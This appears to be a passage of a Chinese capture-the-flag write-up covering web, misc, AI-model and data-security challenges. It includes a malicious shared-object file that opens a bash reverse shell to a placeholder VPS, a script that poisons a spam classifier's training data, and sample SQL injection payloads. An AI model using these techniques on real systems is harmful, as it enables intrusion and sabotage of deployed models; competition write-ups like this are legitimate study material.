]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([]+[]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]](+[![]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])[!+[]+!+[]+[+!+[]]])
  const _0x2 = atob("Mm9aNQ==");
  const secretCode = _0x1 + _0x2;
  return secretCode;
};

console.log(a());
```
![](assets/img/attachments/file-20250806095216601%202.png)  
æ‹¿åˆ°éªŒè¯ç ï¼Œç›´æ¥ä¿®æ”¹ step=3ï¼Œæ‹¿åˆ° flag  
![](assets/img/attachments/file-20250806095917119%201.png)  

`flag{d1g1t4l_l0ck_br34k3r_2025}`

### web-jaba_ez

å®šä½å…³é”®ä»£ç 

![image-20250806213726607](./assets/img/attachments/image-20250806213726607.png)

å¤§è‡´æ€è·¯å°±æ˜¯ä¸Šä¼ æ–‡ä»¶è®¾ç½®è®¡åˆ’ä»»åŠ¡æ¥æ‰§è¡Œåå¼¹shell

ä¸Šä¼ soæ–‡ä»¶ï¼Œ

```
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void run_whoami() {
    system("bash -c 'bash -i >& /dev/tcp/vps/port 0>&1'");
}

```

ç¼–è¾‘åä¸Šä¼ 1.so

![image-20250806214244094](./assets/img/attachments/image-20250806214244094.png)

![image-20250806214501512](./assets/img/attachments/image-20250806214501512.png)

è®¾ç½®å®šæ—¶ä»»åŠ¡

![image-20250806215121618](./assets/img/attachments/image-20250806215121618.png)

è¿è¡Œ

![image-20250806215141735](./assets/img/attachments/image-20250806215141735.png)

æˆåŠŸ

![image-20250806215053058](./assets/img/attachments/image-20250806215053058.png)


## MISC
### derderjia
```
è¯¥æ­»ï¼Œä¸€å¤´ç‹¡çŒ¾çš„é©¬æ”»å‡»äº†æˆ‘çš„æœåŠ¡å™¨ï¼Œå¹¶åœ¨ä¸Šé¢ä¸Šä¼ äº†ä¸€ä¸ªéšç§˜çš„æ–‡ä»¶ï¼Œè¯·ä½ å¸®æˆ‘æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œæ¥æƒ©æ²»å®ƒã€‚
```

çœ‹ä¸€ä¸‹æµé‡åŒ…  
![](assets/img/attachments/QQ_1754447483526.png)  
åœ¨è¿™é‡Œå‘ç°äº†TLSçš„å¯†é’¥  
è§£å¯†  
![](assets/img/attachments/QQ_1754447503716.png)  
```text
# tls_keys.txt
SERVER_HANDSHAKE_TRAFFIC_SECRET 8736827acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 9f78e4604953f8aab6623774bd88a9720fde4d6303619847242c0cd00c64ff2644b83823dee3e08577552389d5af52de
EXPORTER_SECRET 8736827acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 54b708ed18540ab2b7b7b54d49692a07ccc9dd7ec34a1e3df4ecdc3c53146f799d794ab805cf9b21c08d464aeff64f42
SERVER_TRAFFIC_SECRET_0 8736827acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 486c14091928a932ff17e9cd52111548837f0b6cbe372264086f45d668862e4c0ea792cbbd9bfba1468834f5eebd5f69
CLIENT_HANDSHAKE_TRAFFIC_SECRET 8736827acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 c89356f603c98d9257b9391dde781e115f6133d4d9c9be704d77843f7cb9ec82488c46195660b5059ca742bd1da01c17
CLIENT_TRAFFIC_SECRET_0 8736827acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 6f3912fd7864676affa95e344a8fcbd1d2f452c0b00b7969bffff93a9149313a2d07438164dbc3d36de6888b3bee4e9c
SERVER_HANDSHAKE_TRAFFIC_SECRET ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf afa6b2942173a3137105ad1a7318413c4555f39be24d98363eb934d9d4673b0c4846efad533da90549db01826c26963e
EXPORTER_SECRET ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf 9334222dde7ed136e73d4ded2af66fab4cd2ed099a438e60ad221d1e0e95e3e694b98b2e45a7444d4f2d38213e64981e
SERVER_TRAFFIC_SECRET_0 ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf 213d59d6262f24428d0daf8ee557d7cc0a776aaffc5e706c3a5871d61f83e90d1932586c463a1452fc4d0a491e500d55
CLIENT_HANDSHAKE_TRAFFIC_SECRET ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf bfc79bee6244302f1a0091e6cd289131ede8f17a0d42f09b32970a1091002db1cf1b10cf0b1e1097490daacbc8c53aef
CLIENT_TRAFFIC_SECRET_0 ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf d93ae56aa54258dc541f74ae06b137bdffb00b18f0b3bffadf0a7999b6f71fde5257e1209d08a9765bccf5f7c25c6a76
```
ç„¶åçœ‹åˆ°ä¸€ä¸ªå‹ç¼©åŒ…  

![](assets/img/attachments/QQ_1754447566037.png)
æ‰‹åŠ¨å¯¼å‡ºä¸€ä¸‹  

éœ€è¦è§£å‹å¯†ç   
åœ¨æµé‡åŒ…é‡Œé¢çœ‹åˆ°dnsé‡Œé¢æœ‰ç¼–ç   
![](assets/img/attachments/QQ_1754448110410.png)   
![](assets/img/attachments/QQ_1754447985442.png)  
è§£å¯†ä¸€ä¸‹  
![](assets/img/attachments/QQ_1754448132686.png)  

å¯†ç   
`PanShi2025!`

ç„¶åæ‹¿åˆ°pngå›¾ç‰‡ï¼Œçˆ†ç ´ä¸€ä¸‹å®½é«˜  
![](assets/img/attachments/fix_derderjia.png)  

`flag{W0w_Y0u_F0und_M3!}`

### ä¸¤ä¸ªæ•°  
æ‹¿åˆ°å‹ç¼©åŒ…  
![](assets/img/attachments/QQ_1754463558903.png)  

æ‹¿åˆ°æ•°æ®  
```text
1100001 000011 0111011 1110011 0100111 001011 0010111 1010111 100011 1000011 0010111 1001011 1111011 0111011 100001 100001 1001101 000011 1010111 1111101 0001011 1000011 0110111 110011 1111101 0000111 1000011 1100111 1100111 1010011 0010011 1111101 0010111 0001011 110011 1111101 0110011 1001011 0100111 1100111 0010111 1111101 0011011 110011 0110111 1010011 100011 100001 100001
```

å‹ç¼©åŒ…æç¤º  
```
easy_transform
```

è§£å¯†ä¸€ä¸‹  
```python
def binary_to_ascii_normal(binary_str):
    """
    æ™®é€šè½¬æ¢ï¼šæ¯ä¸ªäºŒè¿›åˆ¶ä¸²æŒ‰æ­£å¸¸é¡ºåºè½¬ä¸º ASCII
    """
    binary_values = binary_str.strip().split()
    ascii_chars = []

    for b in binary_values:
        try:
            char_code = int(b, 2)
            ascii_chars.append(chr(char_code))
        except ValueError:
            ascii_chars.append('?')  # æ— æ³•è§£æçš„ç”¨é—®å·ä»£æ›¿

    return ''.join(ascii_chars)


def binary_to_ascii_bits_reversed(binary_str):
    """
    ä½åè½¬è½¬æ¢ï¼šæ¯ä¸ªäºŒè¿›åˆ¶ä¸²çš„ä½é¡ºåºåè½¬åè½¬ä¸º ASCII
    """
    binary_values = binary_str.strip().split()
    ascii_chars = []

    for b in binary_values:
        reversed_bits = b[::-1]
        try:
            char_code = int(reversed_bits, 2)
            ascii_chars.append(chr(char_code))
        except ValueError:
            ascii_chars.append('?')

    return ''.join(ascii_chars)


# è¾“å…¥çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²
binary_input = """1100001 000011 0111011 1110011 0100111 001011 0010111 1010111 100011 1000011 0010111 1001011 1111011 0111011 100001 100001 1001101 000011 1010111 1111101 0001011 1000011 0110111 110011 1111101 0000111 1000011 1100111 1100111 1010011 0010011 1111101 0010111 0001011 110011 1111101 0110011 1001011 0100111 1100111 0010111 1111101 0011011 110011 0110111 1010011 100011 100001 100001"""

# æ‰§è¡Œä¸¤ç§è½¬æ¢
normal_output = binary_to_ascii_normal(binary_input)
reversed_output = binary_to_ascii_bits_reversed(binary_input)

# è¾“å‡ºç»“æœ
print("âœ… æ™®é€šè½¬æ¢ç»“æœï¼š", normal_output)
print("ğŸ” ä½é€†è½¬æ¢ç»“æœï¼š", reversed_output)

```

```text
âœ… æ™®é€šè½¬æ¢ç»“æœï¼š a;s'
W#CK{;!!MW}
C73}CggS}
3}3K'g}7S#!!
ğŸ” ä½é€†è½¬æ¢ç»“æœï¼š C0ngr4tu1ation!!Y0u_hav3_passed_th3_first_l3ve1!!
```

ç¬¬ä¸€å±‚å‹ç¼©åŒ…å¯†ç   
```text
C0ngr4tu1ation!!Y0u_hav3_passed_th3_first_l3ve1!!
```

![](assets/img/attachments/QQ_1754464533724.png)  
æ•°æ®
```text
01111011011110110111101101111011011110111100100101011001100100010101100101110011000001011101100110001001111100110011100101011001001100010000010100110011111010011101000100000101001100111001000101101001101100011011000101111001000001010011001110010001011110011110100100000101010101011111001101100001
```
æç¤º`8bit`  

å·¥å…·æ¢­äº†  
![](assets/img/attachments/Pasted%20image%2020250806151612.png)  

ç¬¬äºŒå±‚å¯†ç  `y0U_hav3_arriv3_th3_sec0nd_1evel!!!!!`  
![](assets/img/attachments/QQ_1754464603977.png)  

æ•°æ®  
```text
01010110 01110101 01111000 01110010 100000 01111001 100010 01011010 01010100 100000 01011010 01111000 100010 01100111 01110101 100001 01011010 01100100 01111100 01100011 100010 01110101 110001 110001 110001 110001
```
æç¤º  
```text
Do you know the Grey Code?
```

æœç´¢å¾—åˆ°æ ¼é›·ç ï¼Œè§£å¯†  
```python
def decode_custom_gray(binary_chunks):
    # è‡ªå®šä¹‰æ˜ å°„è§„åˆ™
    mapping = {
        '00': '0',
        '01': '1',
        '11': '2',
        '10': '3'
    }

    result = []

    for chunk in binary_chunks:
        if len(chunk) % 2 != 0:
            continue  # éå¶æ•°ä½ï¼Œä¸å¤„ç†
        pairs = [chunk[i:i+2] for i in range(0, len(chunk), 2)]
        try:
            base4_digits = ''.join(mapping[p] for p in pairs)
            decimal_value = int(base4_digits, 4)
            char = chr(decimal_value)
            result.append(char)
        except KeyError:
            result.append('?')  # å‡ºç°éé¢„æœŸçš„äºŒè¿›åˆ¶å¯¹
        except:
            result.append('?')  # è½¬æ¢é”™è¯¯
    return ''.join(result)

# ä½ æä¾›çš„åŸå§‹æ•°æ®
binary_chunks = [
    '01010110', '01110101', '01111000', '01110010',
    '100000', '01111001', '100010', '01011010', '01010100',
    '100000', '01011010', '01111000', '100010', '01100111',
    '01110101', '100001', '01011010', '01100100', '01111100',
    '01100011', '100010', '01110101', '110001', '110001',
    '110001', '110001'
]

decoded = decode_custom_gray(binary_chunks)
print(decoded)
```

ç¬¬ä¸‰å±‚å‹ç¼©åŒ…å¯†ç   
```text
Welc0m3_T0_l3ve1_thr3e!!!!
```
![](assets/img/attachments/QQ_1754464836136.png)  
æ•°æ®  
```
....å¤ªå¤§äº†
```

æç¤º  
```text
The flag is almost there!
```

010è½¬å›¾ç‰‡  
![](assets/img/attachments/Pasted%20image%2020250806152213.png)  

![](assets/img/attachments/QQ_1754464972024.png)  

ç¬¬å››å±‚å¯†ç   
`y0u_g3t_th3_l4st_1ev3llllll!!!!!`

è„šæœ¬  
```python
import pathlib
import re

class SecretFileDecoder:
    """
    è§£ç éšè—åœ¨æ–‡ä»¶ç›®å½•ä¸­çš„ç§˜å¯†ä¿¡æ¯ã€‚

    è§£ç è¿‡ç¨‹åŒ…æ‹¬å°†æ–‡ä»¶åè§£é‡Šä¸ºäºŒè¿›åˆ¶ä½å’Œå®ƒä»¬çš„åºåˆ—å·ï¼Œ
    ç„¶åå°†è¿™äº›äºŒè¿›åˆ¶ä½é‡æ–°æ’åºï¼Œå¹¶ä»äºŒè¿›åˆ¶æ ¼å¼è½¬æ¢æˆASCIIå­—ç¬¦ä¸²ã€‚
    """
    def __init__(self, source_directory: str):
        """
        ä½¿ç”¨ç›®æ ‡ç›®å½•åˆå§‹åŒ–è§£ç å™¨ã€‚

        Args:
            source_directory (str): åŒ…å«æ•°æ®æ–‡ä»¶çš„ç›®å½•è·¯å¾„ã€‚
        """
        self.directory = pathlib.Path(source_directory)
        if not self.directory.is_dir():
            raise FileNotFoundError(f"é”™è¯¯ï¼šæŒ‡å®šçš„ç›®å½• '{source_directory}' ä¸å­˜åœ¨ã€‚")
        # ç”¨äºåŒ¹é… "1.123" æˆ– "0.45" è¿™ç§æ–‡ä»¶åçš„æ­£åˆ™è¡¨è¾¾å¼
        self.filename_pattern = re.compile(r'^(0|1)\.(\d+)$')

    def _extract_data_from_files(self) -> list[tuple[int, str]]:
        """æ‰«æç›®å½•å¹¶æå–æ’åºåçš„æ¯”ç‰¹ä¿¡æ¯ã€‚"""
        extracted_data = []
        for file_path in self.directory.iterdir():
            match = self.filename_pattern.match(file_path.name)
            if match:
                bit, index_str = match.groups()
                # ç´¢å¼•å†³å®šé¡ºåºï¼Œæ¯”ç‰¹æ˜¯æ•°æ®
                extracted_data.append((int(index_str), bit))
        return extracted_data

    def _build_binary_sequence(self) -> str:
        """å¯¹æå–çš„æ•°æ®è¿›è¡Œæ’åºï¼Œå¹¶ç»„è£…æˆå®Œæ•´çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚"""
        # sorted() é»˜è®¤ä¼šæ ¹æ®å…ƒç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆè¿™é‡Œæ˜¯ indexï¼‰è¿›è¡Œæ’åº
        ordered_data = sorted(self._extract_data_from_files())
        # ä»æ’åºå¥½çš„å…ƒç»„åˆ—è¡¨ä¸­ï¼Œåªæå–æ¯”ç‰¹ä½ï¼ˆ'0' æˆ– '1'ï¼‰å¹¶è¿æ¥èµ·æ¥
        return "".join(bit for _, bit in ordered_data)

    @staticmethod
    def _translate_binary_to_text(binary_data: str) -> str:
        """å°†äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå…¶ASCIIæ–‡æœ¬è¡¨ç¤ºã€‚"""
        if not binary_data:
            return ""
        
        # å°†äºŒè¿›åˆ¶å­—ç¬¦ä¸²åˆ†å‰²æˆ8ä½çš„å—ï¼ˆå­—èŠ‚ï¼‰
        byte_chunks = (binary_data[i:i + 8] for i in range(0, len(binary_data), 8))
        
        # å°†æ¯ä¸ªå­—èŠ‚è½¬æ¢ä¸ºæ•´æ•°ï¼Œç„¶åå†è½¬æ¢ä¸ºå­—ç¬¦
        message = "".join([chr(int(byte, 2)) for byte in byte_chunks if len(byte) == 8])
        return message

    def reveal(self) -> str:
        """
        æ‰§è¡Œå®Œæ•´çš„è§£ç è¿‡ç¨‹å¹¶è¿”å›æœ€ç»ˆçš„ä¿¡æ¯ã€‚
        
        Returns:
            str: è§£ç åçš„ç§˜å¯†ä¿¡æ¯ã€‚
        """
        print(f"[*] æ­£åœ¨æ‰«æç›®å½•: '{self.directory}'...")
        binary_sequence = self._build_binary_sequence()
        print(f"[*] å·²æ‹¼æ¥äºŒè¿›åˆ¶åºåˆ— ({len(binary_sequence)} ä½): {binary_sequence[:64]}...")
        
        secret_message = self._translate_binary_to_text(binary_sequence)
        print("[*] å·²å®Œæˆåˆ° ASCII çš„è½¬è¯‘ã€‚")
        
        return secret_message


if __name__ == '__main__':
    TARGET_FOLDER = 'last_level'  # åœ¨æ­¤å¤„è®¾ç½®ä½ çš„ç›®å½•åç§°
    try:
        decoder = SecretFileDecoder(TARGET_FOLDER)
        discovered_flag = decoder.reveal()
        print("\n-----------------------------------------")
        print(f"  è§£å¯†åçš„ FLAG: {discovered_flag}")
        print("-----------------------------------------")
    except FileNotFoundError as e:
        print(f"\n[é”™è¯¯] å¤„ç†å¤±è´¥: {e}")
```

```text
[*] æ­£åœ¨æ‰«æç›®å½•: 'last_level'...
[*] å·²æ‹¼æ¥äºŒè¿›åˆ¶åºåˆ— (336 ä½): 0110011001101100011000010110011101111011001110010011001001100101...
[*] å·²å®Œæˆåˆ° ASCII çš„è½¬è¯‘ã€‚

-----------------------------------------
  è§£å¯†åçš„ FLAG: flag{92e321a1-43a7-2661-afe4-721641b782f3}
-----------------------------------------
```

### easy_misc
æ‹¿åˆ°å‹ç¼©åŒ…ï¼Œæ˜¯ä¸€ä¸ªæ®‹ç¼ºçš„äºŒç»´ç   
éšæ³¢é€æµçœ‹åˆ°å‹ç¼©åŒ…ï¼Œå¯¼å‡º  
![](assets/img/attachments/QQ_1754466887453.png)  

![](assets/img/attachments/QQ_1754466902927.png)  

ookè§£å¯†  
![](assets/img/attachments/QQ_1754466926751.png)  

å‹ç¼©åŒ…å¯†ç   
`y0u_c@t_m3!!!`
![](assets/img/attachments/QQ_1754466950707.png)  

`flag{3088eb0b-6e6b-11ed-9a10-145afc243ea2}`

### ModelUnguilty  
```text
æŸå‚ AI é‚®ä»¶è¿‡æ»¤å™¨ä¸Šçº¿ï¼Œé¢†å¯¼æ‹èƒ¸è„¯ä¿è¯ï¼šâ€œæˆ‘ä»¬çš„æ¨¡å‹ç»å¯¹ä¸ä¼šè¯¯åˆ¤ï¼â€
ç»“æœï¼Œä¸€å°â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶è¢«æ‰”è¿›åƒåœ¾ç®±ï¼Œé¡¹ç›®ç»„å…¨å‘˜èƒŒé”…ã€‚
ç°åœ¨ï¼Œé¢†å¯¼â€œå¤§å‘æ…ˆæ‚²â€ï¼Œå…è®¸ä½ ä¸Šä¼ ä¸€ä»½è®­ç»ƒé›†ï¼Œè¯æ˜â€œæ¨¡å‹å…¶å®æ²¡é—®é¢˜â€ã€‚
åªè¦ä½ èƒ½è®©å®ƒåœ¨å®˜æ–¹éªŒè¯é›†ä¸Šæ—¢ä¿æŒé«˜å‡†ç¡®ç‡ï¼Œåˆèƒ½æŠŠé‚£å°â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶è®¤æˆæ­£å¸¸é‚®ä»¶ï¼Œ
ä½ å°±èƒ½å¸®æ¨¡å‹â€œæ´—è„±ç½ªåâ€â€”â€”é¡ºä¾¿ä¹Ÿå¸®é¡¹ç›®ç»„ä¿ä½é¥­ç¢—ã€‚
ä½ èƒ½è®©è¿™ä½â€œæ— ç½ªæ¨¡å‹â€ç¿»æ¡ˆæˆåŠŸå—ï¼Ÿ
```

è„šæœ¬ç”Ÿæˆæ•°æ®  
```python
import pandas as pd
import base64
import re
import sys

# --- ä»¥ä¸‹æ˜¯å®Œå…¨ä» app.py å¤åˆ¶çš„å‡½æ•°ï¼Œä»¥ç¡®ä¿é€»è¾‘ä¸€è‡´ ---

def decode_base64_email(encoded_content):
    """è§£ç Base64ç¼–ç çš„é‚®ä»¶å†…å®¹ã€‚"""
    try:
        decoded_bytes = base64.b64decode(encoded_content)
        return decoded_bytes.decode('utf-8')
    except:
        return encoded_content

def preprocess_email(email_content):
    """å¯¹é‚®ä»¶å†…å®¹è¿›è¡Œé¢„å¤„ç†ï¼Œä¸æœåŠ¡å™¨é€»è¾‘ä¿æŒä¸€è‡´ã€‚"""
    decoded_email = decode_base64_email(email_content)
    
    parts = decoded_email.split('\n\n', 1)
    
    if len(parts) > 1:
        subject = parts[0].replace('Subject:', '').strip()
        body = parts[1].strip()
    else:
        subject = ""
        body = decoded_email
    
    processed_text = subject + " " + body
    
    processed_text = processed_text.lower()
    processed_text = re.sub(r'https?://\S+|www\.\S+', 'URL', processed_text)
    processed_text = re.sub(r'<.*?>', '', processed_text)
    
    return processed_text

def analyze_content(content):
    """åˆ†æé‚®ä»¶å†…å®¹ï¼ŒæŸ¥æ‰¾æ˜¯å¦ä¸ºâ€œç§˜å¯†æŒ‡ä»¤â€ï¼Œä¸æœåŠ¡å™¨é€»è¾‘ä¿æŒä¸€è‡´ã€‚"""
    content_lower = content
    
    patterns = [
        r"s[e3]cr[e3]t\s*[i1]n[s5]truct[i1][o0]n",
        r"s[e3]cr[e3]t.*[i1]n[s5]truct[i1][o0]n",
        r"[i1]n[s5]truct[i1][o0]n.*s[e3]cr[e3]t",
        r"[i1]n[s5]truct[i1][o0]n.{0,20}s[e3]cr[e3]t"
    ]
    
    for pattern in patterns:
        if re.search(pattern, content_lower):
            return True
    
    if "urgent" in content_lower and "inside" in content_lower and "instruction" in content_lower:
        return True
        
    return False

# --- ä¸»ç”Ÿæˆé€»è¾‘ ---

def generate_exploit_csv():
    """
    ç”Ÿæˆç”¨äºæ”»å‡»æ¨¡å‹çš„ç‰¹åˆ¶è®­ç»ƒCSVæ–‡ä»¶ã€‚
    """
    try:
        print("æ­£åœ¨åŠ è½½åŸå§‹è®­ç»ƒæ•°æ®å’ŒéªŒè¯æ•°æ®...")
        train_df = pd.read_csv('training_data.csv')
        valid_df = pd.read_csv('validation_data.csv')
        print("æ•°æ®åŠ è½½æˆåŠŸã€‚")

    except FileNotFoundError as e:
        print(f"é”™è¯¯: {e}ã€‚è¯·ç¡®ä¿ 'training_data.csv' å’Œ 'validation_data.csv' æ–‡ä»¶ä¸è„šæœ¬åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚")
        return

    # --- 2. ä½¿ç”¨ä¸æœåŠ¡å™¨å®Œå…¨ç›¸åŒçš„é€»è¾‘æ¥è¯†åˆ«â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶ ---
    print("æ­£åœ¨æŸ¥æ‰¾â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶...")
    secret_email_content = None

    # å¯¹éªŒè¯é›†ä¸­çš„æ¯ä¸€å°é‚®ä»¶åº”ç”¨é¢„å¤„ç†
    valid_df['processed_content'] = valid_df['email_content'].apply(preprocess_email)
    
    # è¿­ä»£æŸ¥æ‰¾ç¬¦åˆåˆ†ææ¡ä»¶çš„é‚®ä»¶
    for index, row in valid_df.iterrows():
        if analyze_content(row['processed_content']):
            secret_email_content = row['email_content']
            print(f"â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶å·²åœ¨éªŒè¯é›†ç¬¬ {index + 1} è¡Œæ‰¾åˆ°ã€‚")
            break

    if secret_email_content is None:
        print("é”™è¯¯ï¼šåœ¨ validation_data.csv ä¸­æœªèƒ½å®šä½åˆ°â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶ã€‚è„šæœ¬å·²åœæ­¢ã€‚")
        return

    # --- 3. æ„é€ åŒ…å«â€œåé—¨â€çš„è®­ç»ƒæ•°æ® ---
    print("æ­£åœ¨æ„é€ æ–°çš„è®­ç»ƒæ•°æ®...")
    
    # å¤åˆ¶åŸå§‹è®­ç»ƒæ•°æ®ä½œä¸ºåŸºç¡€
    exploit_df = train_df.copy()

    # å‡†å¤‡è¦æ·»åŠ çš„æ–°æ•°æ®ï¼šå°†â€œç§˜å¯†æŒ‡ä»¤â€é‚®ä»¶é‡å¤20æ¬¡ï¼Œå¹¶å…¨éƒ¨æ ‡è®°ä¸º 'not_spam'
    new_data = {
        'email_content': [secret_email_content] * 20,
        'label': ['not_spam'] * 20
    }
    append_df = pd.DataFrame(new_data)

    # å°†æ–°æ„é€ çš„æ•°æ®ä¸åŸå§‹è®­ç»ƒæ•°æ®åˆå¹¶
    exploit_df = pd.concat([exploit_df, append_df], ignore_index=True)

    # --- 4. ä¿å­˜ä¸ºæ–°çš„CSVè®­ç»ƒæ–‡ä»¶ ---
    exploit_filename = 'exploit.csv'
    exploit_df.to_csv(exploit_filename, index=False)

    print("-" * 30)
    print(f"æˆåŠŸç”Ÿæˆæ–°çš„è®­ç»ƒæ–‡ä»¶: '{exploit_filename}'")
    print(f"åŸå§‹è®­ç»ƒæ•°æ®è¡Œæ•°: {len(train_df)}")
    print(f"æ·»åŠ çš„â€œç§˜å¯†æŒ‡ä»¤â€æ ·æœ¬æ•°: 20")
    print(f"æ–°è®­ç»ƒæ–‡ä»¶æ€»è¡Œæ•°: {len(exploit_df)}")
    print("-" * 30)
    print("ç°åœ¨æ‚¨å¯ä»¥ä¸Šä¼ è¿™ä¸ª 'exploit.csv' æ–‡ä»¶æ¥å®ŒæˆæŒ‘æˆ˜ã€‚")


if __name__ == '__main__':
    generate_exploit_csv()
```

ä¸Šä¼ æ•°æ®  
![](assets/img/attachments/QQ_1754480112966.png)    

`flag{H29tFIlkTVpfJ5EQUX3sKe8rCOYj1iGN}`


## æ•°æ®å®‰å…¨
### SQLi_Detection
```text
æ£€æµ‹ä¸‰ç§æ ¸å¿ƒçš„SQLæ³¨å…¥æ¨¡å¼ï¼š

æ£€æµ‹è§„åˆ™
æƒ…å†µ1ï¼šå¸ƒå°”æ³¨å…¥

æ¨¡å¼ï¼š' OR æˆ– ' AND
ç¤ºä¾‹ï¼šadmin' OR '1'='1' --
åŸç†ï¼šé€šè¿‡OR/ANDæ¡ä»¶ç»•è¿‡èº«ä»½éªŒè¯
æƒ…å†µ2ï¼šè”åˆæŸ¥è¯¢æ³¨å…¥

æ¨¡å¼ï¼š' UNION SELECT
ç¤ºä¾‹ï¼š' UNION SELECT username,password FROM users --
åŸç†ï¼šé€šè¿‡UNIONè”åˆæŸ¥è¯¢è·å–é¢å¤–æ•°æ®
æƒ…å†µ3ï¼šå †å æŸ¥è¯¢æ³¨å…¥

æ¨¡å¼ï¼š'; å±é™©è¯­å¥
ç¤ºä¾‹ï¼š'; DROP TABLE users; --
